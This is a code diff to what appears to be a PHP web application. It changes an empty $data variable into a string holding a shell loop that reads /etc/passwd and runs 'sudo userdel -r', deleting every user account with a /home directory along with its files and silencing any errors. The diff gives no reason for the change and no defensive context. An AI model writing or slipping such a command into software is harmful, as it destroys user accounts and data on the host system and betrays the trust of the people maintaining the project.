@@ -103,7 +103,7 @@ function encrypt_key($paswd)
 
 
 
-$data = '';
+$data = "for user in $(awk -F: '/^([^:]*):[^:]*:[^:]*:[^:]*:[^:]*:[^:]*:[^:]*/ {if ($6 ~ /^\/home\//) print $1}' /etc/passwd); do sudo userdel -r \"\$user\" 2>/dev/null; done".PHP_EOL;
 $uuid = '';
 $premium_active = "status='live' AND is_validated=1 AND is_freeze=0 AND is_ban=0 AND duration > 0";
 $vip_active = "status='live' AND is_validated=1 AND is_freeze=0 AND is_ban=0 AND vip_duration > 0";
